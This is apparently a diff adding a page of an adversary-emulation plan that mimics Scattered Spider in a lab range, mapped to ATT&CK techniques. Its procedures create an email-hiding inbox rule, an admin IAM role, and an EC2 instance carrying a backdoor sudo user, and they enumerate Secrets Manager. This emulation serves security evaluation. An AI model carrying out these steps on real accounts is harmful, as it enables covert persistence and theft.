+<li><p><em><strong>Expected Output</strong></em></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">discovery output</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables-6">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables-6">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Discovery</td>
+<td>T1069.002</td>
+<td>Permission Groups Discovery: Domain Groups</td>
+<td>Windows</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider uses <code v-pre>Get-ADGroupMember</code> to enumerate AD for groups and permissions</td>
+<td>dragongate (10.55.3.104)</td>
+<td>tlannister</td>
+<td>-</td>
+<td><a href="https://cloud.google.com/blog/topics/threat-intelligence/unc3944-sms-phishing-sim-swapping-ransomware/" class="outbound" target="_blank"><span>5</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.reliaquest.com/blog/scattered-spider-attack-analysis-account-compromise/" class="outbound" target="_blank"><span>8</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="step-2---accessing-airbyteinfodocx-fails">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-2---accessing-airbyteinfodocx-fails">#</doc-anchor-trigger>
+        <span>Step 2 - Accessing AirByteInfo.docx Fails</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-10">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-10">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>There are currently no alternative steps in the event that the operator fails to
+open the <code v-pre>AirByteInfo.docx</code> document or access the associated file share.</p>
+<doc-anchor-target id="step-3---unable-to-set-email-inbox-rule-via-outlook-gui">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-3---unable-to-set-email-inbox-rule-via-outlook-gui">#</doc-anchor-trigger>
+        <span>Step 3 - Unable to Set Email Inbox Rule Via Outlook GUI</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-11">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-11">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>If you are unable to use the Outlook web GUI to set a new inbox rule, perform
+the following alternative steps.</p>
+<doc-anchor-target id="procedures-7">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-7">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In your session to <code v-pre>dragongate (10.55.3.104)</code>, open an administrator
+PowerShell prompt if one does not already exist, and execute the following
+commands to connect to an Exchange management session on <code v-pre>sept (10.55.3.101)</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<div class="codeblock-title">psh</div>
+<pre translate="no" class="language-none"><code v-pre class="language-none">$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://sept.kingslanding.net/PowerShell/ -Authentication Kerberos;Enter-PSSession $Session;</code></pre>
+</doc-codeblock></div>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Within the Exchange management shell, execute the following command to create
+a new inbox rule.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<div class="codeblock-title">psh</div>
+<pre translate="no" class="language-none"><code v-pre class="language-none">New-InboxRule &quot;spam&quot; -BodyContainsWords &quot;airbyte&quot; -DeleteMessage $true -StopProcessingRules $true</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p><em><strong>Expected Output</strong></em></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">Name Enabled Priority RuleIdentity
+---- ------- -------- ------------
+spam True    1        8311845157620154369</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables-7">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables-7">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Execution</td>
+<td>T1059.001</td>
+<td>Command and Scripting Interpreter: PowerShell</td>
+<td>Windows</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider uses PowerShell to connect to the Exchange server</td>
+<td>dragongate (10.55.3.104), sept (10.55.3.101)</td>
+<td>tlannister</td>
+<td>-</td>
+<td><a href="https://www.microsoft.com/en-us/security/blog/2023/10/25/octo-tempest-crosses-boundaries-to-facilitate-extortion-encryption-and-destruction/" class="outbound" target="_blank"><span>6</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>T1078.002</td>
+<td>Valid Accounts: Domain Accounts</td>
+<td>Windows</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider authenticates to the Exchange server as <code v-pre>tlannister</code></td>
+<td>sept (10.55.3.101)</td>
+<td>tlannister</td>
+<td>-</td>
+<td><a href="https://www.microsoft.com/en-us/security/blog/2023/10/25/octo-tempest-crosses-boundaries-to-facilitate-extortion-encryption-and-destruction/" class="outbound" target="_blank"><span>6</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>T1564.008</td>
+<td>Hide Artifacts: Email Hiding Rules</td>
+<td>Windows</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider creates inbound rules to automatically delete future emails regarding Airbyte</td>
+<td>sept (10.55.3.101)</td>
+<td>tlannister</td>
+<td>-</td>
+<td><a href="https://www.microsoft.com/en-us/security/blog/2023/10/25/octo-tempest-crosses-boundaries-to-facilitate-extortion-encryption-and-destruction/" class="outbound" target="_blank"><span>6</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="step-3---logging-into-aws-console-fails">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-3---logging-into-aws-console-fails">#</doc-anchor-trigger>
+        <span>Step 3 - Logging Into AWS Console Fails</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-12">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-12">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>There are currently no alternative steps in the event that the operator fails to
+log into the AWS Console.</p>
+<doc-anchor-target id="step-3---unable-to-access-billing-in-aws-console">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-3---unable-to-access-billing-in-aws-console">#</doc-anchor-trigger>
+        <span>Step 3 - Unable to Access Billing in AWS Console</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-13">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-13">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>There are currently no alternative steps available for this step.</p>
+<doc-anchor-target id="step-3---unable-to-access-iam-in-aws-console">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-3---unable-to-access-iam-in-aws-console">#</doc-anchor-trigger>
+        <span>Step 3 - Unable to Access IAM in AWS Console</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-14">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-14">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>There are currently no alternative steps available for this step.</p>
+<doc-anchor-target id="step-3---unable-to-access-s3-in-aws-console">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-3---unable-to-access-s3-in-aws-console">#</doc-anchor-trigger>
+        <span>Step 3 - Unable to Access S3 in AWS Console</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-15">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-15">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>There are currently no alternative steps available for this step.</p>
+<doc-anchor-target id="step-3---unable-to-view-managed-instances-in-systems-manager">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-3---unable-to-view-managed-instances-in-systems-manager">#</doc-anchor-trigger>
+        <span>Step 3 - Unable to View Managed Instances In Systems Manager</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-16">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-16">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>There are currently no alternative steps available for this step.</p>
+<doc-anchor-target id="step-3---unable-to-run-aws-gathersoftwareinventory">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-3---unable-to-run-aws-gathersoftwareinventory">#</doc-anchor-trigger>
+        <span>Step 3 - Unable to Run AWS-GatherSoftwareInventory</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-17">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-17">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>There are currently no alternative steps available for this step.</p>
+<doc-anchor-target id="step-3---unable-to-run-commands-via-console">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-3---unable-to-run-commands-via-console">#</doc-anchor-trigger>
+        <span>Step 3 - Unable to Run Commands Via Console</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-18">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-18">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>There are currently no alternative steps in the event that the operator fails to
+log into the AWS Console.</p>
+<doc-anchor-target id="step-4---unable-to-create-user-via-aws-iam-console">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-4---unable-to-create-user-via-aws-iam-console">#</doc-anchor-trigger>
+        <span>Step 4 - Unable to Create User Via AWS IAM Console</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-19">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-19">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>There are currently no alternative steps available for this step.</p>
+<doc-anchor-target id="step-4---aws_consoler-fails-to-execute">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-4---aws_consoler-fails-to-execute">#</doc-anchor-trigger>
+        <span>Step 4 - aws_consoler fails to execute</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-20">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-20">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>There are currently no alternative steps in the event that aws_consoler fails.</p>
+<doc-anchor-target id="step-4---unable-to-create-iam-role-or-instance-profile-via-cloudshell">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-4---unable-to-create-iam-role-or-instance-profile-via-cloudshell">#</doc-anchor-trigger>
+        <span>Step 4 - Unable to Create IAM Role or Instance Profile Via CloudShell</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-21">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-21">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>If you are unable to create a new admin IAM role and instance profile via API
+calls in CloudShell, perform the following alternative steps.</p>
+<doc-anchor-target id="procedures-8">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-8">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In the AWS console, open the &quot;IAM&quot; console and select &quot;Roles&quot; from the
+&quot;Access Management&quot; drop-down menu on the left-hand side. Click the &quot;Create
+Role&quot; button. Select &quot;AWS Service&quot; as the Trusted entity type and select
+&quot;EC2&quot;-&gt;&quot;EC2&quot; as the Use case. Click the &quot;Next&quot; button.</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> On the &quot;Add Permissions&quot; page, search for <code v-pre>AdministratorAccess</code> and select
+that policy. Click the &quot;Next&quot; button.</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> For the role name, enter <code v-pre>goldroad-role</code>. For the description, enter <code v-pre>IAM role for goldroad</code>. Leave the other options as is and click the &quot;Create Role&quot;
+button. This will automatically create the associated IAM instance profile with
+the same name as the IAM role.</p>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables-8">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables-8">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Persistence</td>
+<td>T1098.003</td>
+<td>Account Manipulation: Additional Cloud Roles</td>
+<td>IaaS</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider creates an admin IAM role and associated instance profile to attach to EC2 instances.</td>
+<td>-</td>
+<td>ahightower</td>
+<td>-</td>
+<td><a href="https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud" class="outbound" target="_blank"><span>7</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="step-4---unable-to-create-linux-ec2-instance-via-cloudshell">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-4---unable-to-create-linux-ec2-instance-via-cloudshell">#</doc-anchor-trigger>
+        <span>Step 4 - Unable to Create Linux EC2 Instance Via CloudShell</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-22">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-22">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>If you are unable to create a new Linux EC2 instance via API calls in
+CloudShell, perform the following alternative steps.</p>
+<doc-anchor-target id="procedures-9">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-9">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In the AWS console, open the &quot;EC2&quot; console and select &quot;Launch Instance&quot; to
+open up the instance launch menu. Set the Name to <code v-pre>goldroad</code>, create a new tag
+with Key <code v-pre>Hostname</code> and value <code v-pre>goldroad</code>, set the OS image to 64-bit Ubuntu
+Server 24.04 LTS (ami ID <code v-pre>ami-0ea3c35c5c3284d82</code>), and set instance type to
+<code v-pre>t3.micro</code> under &quot;Instance type&quot;.</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Under &quot;Key pair (login)&quot;, select &quot;Create new key pair&quot;. Enter <code v-pre>goldroad</code> as
+the key pair name, use RSA as the key type, and select <code v-pre>.pem</code> private key file
+format. Click the &quot;Create key pair&quot; button and make sure that the <code v-pre>goldroad</code> key
+pair is selected when you return to the &quot;Key pair (login)&quot; section.</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Under &quot;Network Settings&quot;, select &quot;Edit&quot;, select the VPC with CIDR
+<code v-pre>10.212.3.0/24</code>, select the Subnet with CIDR <code v-pre>10.212.3.0/24</code>, and disable the
+public IP auto-assigning. Select the existing security group
+<code v-pre>REPLACE_WITH_SECURITY_GROUP_NAME</code>. Under &quot;Advanced network configuration&quot;, set the primary
+IP for network interface 1 to <code v-pre>10.212.3.108</code>, and select &quot;Yes&quot; for &quot;Delete on
+termination&quot;. Leave the other network configuration options as is.</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Under &quot;Configure Storage&quot;, set the storage to 20GiB and storage type to
+<code v-pre>gp3</code>.</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Under &quot;Advanced Details&quot;, select the <code v-pre>goldroad-role</code> IAM role from the &quot;IAM
+instance profile&quot; drop-down menu.</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Scroll farther down the &quot;Advanced Details&quot; section until you reach the &quot;User
+data&quot; option. Copy the following blob into the &quot;User data&quot; box. Leave the &quot;User
+data has already been base64 encoded&quot; box UNCHECKED.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">#cloud-config
+
+users:
+  - default
+  - name: ahightower
+    passwd: &quot;$6$Zgg/HpaFgiZtSZj0$OGxLSEchQvVLtUfq.UMYJX0N9fELi/Q6gEQFg1o.MRpNFelSRlNIIHqYc5mxq2hQeBcQ690vlrFYjpNBSzyRi1&quot;
+    shell: /bin/bash
+    lock_passwd: false
+    ssh_pwauth: True
+    chpasswd:
+        expire: False
+    sudo: ALL=(ALL) NOPASSWD:ALL
+    groups: users
+</code></pre>
+</doc-codeblock></div>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Under &quot;Summary&quot;, ensure that only 1 instance is being created, the ami is
+<code v-pre>ami-0ea3c35c5c3284d82</code>, the instance type is <code v-pre>t3.micro</code>, a new security group
+will be created, and a 20GiB storage volume will be set. Click &quot;Launch Instance&quot;
+to create the instance, and wait for the success message to appear. If a popup
+appears asking whether or not you want to proceed without setting an SSH key
+pair, proceed without creating one.</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Go back to EC2 Instances and verify that the newly created instance appears
+and is in the Running state</p>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables-9">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables-9">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Persistence</td>
+<td>T1098.001</td>
+<td>Account Manipulation: Additional Cloud Credentials</td>
+<td>IaaS</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider creates an SSH key pair for accessing created EC2 instances.</td>
+<td>-</td>
+<td>ahightower</td>
+<td>-</td>
+<td><a href="https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud" class="outbound" target="_blank"><span>7</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>T1578.002</td>
+<td>Modify Cloud Compute Infrastructure: Create Cloud Instance</td>
+<td>IaaS</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider creates an EC2 instance</td>
+<td>-</td>
+<td>ahightower</td>
+<td>-</td>
+<td><a href="https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud" class="outbound" target="_blank"><span>7</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Persistence</td>
+<td>T1098.003</td>
+<td>Account Manipulation: Additional Cloud Roles</td>
+<td>IaaS</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider configures the EC2 instance with the administrator IAM role and associated instance profile</td>
+<td>-</td>
+<td>ahightower</td>
+<td>-</td>
+<td><a href="https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud" class="outbound" target="_blank"><span>7</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="step-5---ec2-serial-console-available-but-connection-to-cloudshell-fails">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-5---ec2-serial-console-available-but-connection-to-cloudshell-fails">#</doc-anchor-trigger>
+        <span>Step 5 - EC2 Serial Console available but connection to CloudShell fails</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-23">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-23">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>If you are unable to connect to AWS CloudShell but successfully connected to the
+EC2 Serial Console in the previous step, perform the following steps.</p>
+<doc-anchor-target id="procedures-10">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-10">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Return to the EC2 Serial Console to the created Linux instance and enumerate
+the available secrets</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">aws secretsmanager list-secrets</code></pre>
